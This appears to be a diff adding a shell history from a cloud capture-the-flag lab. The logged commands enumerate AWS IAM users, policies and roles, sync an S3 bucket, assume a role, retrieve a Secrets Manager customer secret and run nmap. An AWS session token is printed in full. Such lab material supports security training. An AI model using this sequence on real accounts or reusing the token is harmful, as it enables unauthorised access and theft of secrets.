@@ -1,0 +1,53 @@
+   62  mkdir iam-enum
+   63  cd iam-enum
+   64  ls
+   66  aws configure
+   89  aws sts get-caller-identity 
+   90  aws iam get-user
+   91  aws iam list-groups-for-user --user-name dev01
+   92  aws iam list-attached-user-policies --user-name dev01
+   93  aws iam list-user-policies --user-name dev01
+   94  aws iam list-policy-version --policy-arn arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess
+   98  aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess --version-id v4
+   99  aws iam list-policy-versions --policy-arn arn:aws:iam::794929857501:policy/dev01
+  100  aws iam get-policy-version --policy-arn arn:aws:iam::794929857501:policy/dev01 --version-id v7
+  101  aws iam get-user
+  103  aws iam list-attached-user-policies
+  104  aws iam list-attached-user-policies --user-name dev01
+  105  aws iam list-user-policies --user-name dev01
+  106  aws iam get-user-policy --user-name dev01 --policy-name cloudshell
+  107  aws iam get-user-policy --user-name dev01 --policy-name s3_access
+  108  aws iam get-role
+  109  aws iam get-user
+  110  aws iam get-role --role-name arn:aws:iam::794929857501:role/BackendDev
+  111  aws iam get-role --role-name BackendDev
+  112  aws iam get-policy-version --policy-arn arn:aws:iam::794929857501:policy/dev01 --version-id v7
+  113  aws iam list-attached-role-policies --role-name BackendDev
+  115  aws iam get-role --role-name BackendDev
+  117  aws iam get-policy --policy-arn arn:aws:iam::794929857501:policy/BackendDevPolicy
+  118  aws iam get-policy-version --policy-arn arn:aws:iam::794929857501:policy/dev01 --version-id v7
+  119  aws iam get-policy --policy-arn arn:aws:iam::794929857501:policy/BackendDevPolicy
+  120  aws iam get-policy --policy-arn arn:aws:iam::794929857501:policy/BackendDevPolicy --version-id 1
+  121  aws iam get-policy --policy-arn arn:aws:iam::794929857501:policy/BackendDevPolicy --version-id v1
+  122  aws iam get-policy-version --policy-arn arn:aws:iam::794929857501:policy/BackendDevPolicy --version-id v1
+  127  aws iam get-user-policy --user-name dev01 --policy-name S3_Access
+  128  aws s3 ls hl-dev-artifacts
+  129  mkdir ./hl-dev-artifacts
+  130  aws s3 sync s3://hl-dev-artifacts ./hl-dev-artifacts
+  133  cd hl-dev-artifacts
+  134  ls
+  135  cat flag.txt
+  136  aws iam list-user-policies --user-name dev01
+  137  aws iam list-attached-role-policies --role-name dev01
+  138  aws iam list-attached-role-policies --user-name dev01
+  139  aws iam list-attached-user-policies --user-name dev01
+  140  aws iam get-policy --policy-arn arn:aws:iam::794929857501:policy/dev01
+  141  aws iam get-policy-version --policy-arn arn:aws:iam::794929857501:policy/dev01 --version-id v7
+  142  aws iam get-role --role-name BackendDev
+  152  aws sts assume-role --role-arn arn:aws:iam::794929857501:role/BackendDev --role-session-name IAMEnum
+  161  aws configure 
+  162  aws configure set aws_session_token "FwoGZXIvYXdzEIv//////////wEaDOdWkQ5dfM3BqTUMdSKrATUr1mSUZbMli5WCVJ1R+hOa9pO3CYnTf4v5zT4cVoSVi2nzJqjKwBfgMoUsbG+BK+7SSpPNLXL6RFP3rBDZxwOgz4ghxEOaSvvApHtcEaO5UxC3FmFNvBvoezFTFYNfUgGZ9rAsNjEga+cd2rf1gMoH63hDqatOnzGJ6OlariTXONsWbryz52aPqAvMiScBRzSP0eWuSQKeVuzl2fQ6ZuwLxNCRy/X8JjhOjCiF15zIBjItRPPLAEn9ouephYiAZjJXYOA2XTreI4Dm8sTObu1XWRn8JukJhUsn75W+3Jeg"
+  163  aws sts get-caller-identity 
+  164  cloudfox aws secrets
+  165  aws secretsmanager get-secret-value \\n--secret-id prod/Customers \\n--region us-east-1
+  166  nmap -A 10.10.14.15
